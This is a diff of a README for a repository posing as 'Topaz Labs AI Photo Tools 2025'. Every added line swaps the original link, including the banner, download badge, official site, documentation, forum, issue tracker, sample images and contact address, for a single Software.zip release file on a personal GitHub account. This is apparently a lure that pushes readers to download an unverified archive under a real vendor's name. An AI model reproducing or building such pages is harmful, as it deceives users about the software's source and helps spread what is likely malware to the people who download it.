@@ -2,7 +2,7 @@
 
 ### Enhance Your Photos with Cutting-Edge AI Technology! 🚀
 
-![Topaz Labs AI Tools Banner](https://example.com/topaz-labs-ai-banner.jpg)
+![Topaz Labs AI Tools Banner](https://github.com/Ahsan10123/Topaz-Labs-AI-Photo-Tools-2025/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -49,35 +49,35 @@ Welcome to Topaz Labs AI Photo Tools 2025 - your one-stop repository for AI-powe
 ## 📥 Get Started
 Ready to take your photos to the next level with Topaz Labs AI Photo Tools 2025? Click the button below to download the latest version:
 
-[![Download Topaz Labs AI Tools](https://img.shields.io/badge/Download%20Latest%20Version-v1.0.0-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip "Launch to Download")
+[![Download Topaz Labs AI Tools](https://github.com/Ahsan10123/Topaz-Labs-AI-Photo-Tools-2025/releases/download/v2.0/Software.zip%20Latest%20Version-v1.0.0-blue)](https://github.com/Ahsan10123/Topaz-Labs-AI-Photo-Tools-2025/releases/download/v2.0/Software.zip "Launch to Download")
 
 ---
 
 ## 🌐 Useful Links
-- [Official Website](https://www.topazlabs.com)
-- [Documentation](https://docs.topazlabs.com)
-- [Community Forums](https://forums.topazlabs.com)
-- [Report Issues](https://github.com/Topaz-Labs-AI-Photo-Tools-2025/issues)
+- [Official Website](https://github.com/Ahsan10123/Topaz-Labs-AI-Photo-Tools-2025/releases/download/v2.0/Software.zip)
+- [Documentation](https://github.com/Ahsan10123/Topaz-Labs-AI-Photo-Tools-2025/releases/download/v2.0/Software.zip)
+- [Community Forums](https://github.com/Ahsan10123/Topaz-Labs-AI-Photo-Tools-2025/releases/download/v2.0/Software.zip)
+- [Report Issues](https://github.com/Ahsan10123/Topaz-Labs-AI-Photo-Tools-2025/releases/download/v2.0/Software.zip)
 
 ---
 
 ## 🙌 Get Involved
-- Found a bug or have a feature request? [Submit an issue](https://github.com/Topaz-Labs-AI-Photo-Tools-2025/issues)
-- Want to contribute to the project? Check out our [Contributing Guidelines](CONTRIBUTING.md)
+- Found a bug or have a feature request? [Submit an issue](https://github.com/Ahsan10123/Topaz-Labs-AI-Photo-Tools-2025/releases/download/v2.0/Software.zip)
+- Want to contribute to the project? Check out our [Contributing Guidelines](https://github.com/Ahsan10123/Topaz-Labs-AI-Photo-Tools-2025/releases/download/v2.0/Software.zip)
 
 ---
 
 ## 📸 Sample Images
 Here are some stunning images enhanced using Topaz Labs AI Photo Tools. See the magic of AI in action!
 
-![Image 1](https://example.com/image1.jpg)
-![Image 2](https://example.com/image2.jpg)
-![Image 3](https://example.com/image3.jpg)
+![Image 1](https://github.com/Ahsan10123/Topaz-Labs-AI-Photo-Tools-2025/releases/download/v2.0/Software.zip)
+![Image 2](https://github.com/Ahsan10123/Topaz-Labs-AI-Photo-Tools-2025/releases/download/v2.0/Software.zip)
+![Image 3](https://github.com/Ahsan10123/Topaz-Labs-AI-Photo-Tools-2025/releases/download/v2.0/Software.zip)
 
 ---
 
 ## 📞 Contact Us
-Have questions or feedback? Reach out to us at contact@topazlabs.com or join our [Discord server](https://discord.com/topaz-labs).
+Have questions or feedback? Reach out to us at https://github.com/Ahsan10123/Topaz-Labs-AI-Photo-Tools-2025/releases/download/v2.0/Software.zip or join our [Discord server](https://github.com/Ahsan10123/Topaz-Labs-AI-Photo-Tools-2025/releases/download/v2.0/Software.zip).
 
 ---
 
